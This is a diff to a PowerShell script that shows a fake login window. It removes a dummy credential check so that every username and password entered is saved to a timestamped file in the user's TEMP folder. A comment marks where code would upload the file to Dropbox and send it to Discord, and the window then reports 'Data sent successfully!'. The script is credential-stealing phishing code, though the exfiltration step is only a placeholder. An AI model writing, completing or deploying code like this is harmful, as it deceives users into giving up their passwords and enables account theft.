@@ -123,21 +123,15 @@ $loginButton.Add_Click({
     $enteredUsername = $Username.Text
     $enteredPassword = $Password.Password
 
-    # Perform authentication logic here, e.g., check credentials
-    if ($enteredUsername -eq "w" -and $enteredPassword -eq "5") {
-        $loginWindow.Close()
-        Write-Host "Login successful!"
+    # Send the collected data
+    $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+    $creds = "Email: $enteredUsername`nPassword: $enteredPassword"
+    $creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8
 
-        # Send the collected data
-        $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-        $creds = "Email: $enteredUsername`nPassword: $enteredPassword"
-        $creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8
+    # Add your code for uploading the file to Dropbox and sending to Discord here
 
-        # Add your code for uploading the file to Dropbox and sending to Discord here
-    } else {
-        Write-Host "Login failed!"
-        # You can display an error message here if needed
-    }
+    $loginWindow.Close()
+    Write-Host "Data sent successfully!"
 })
 
 # Show the login window
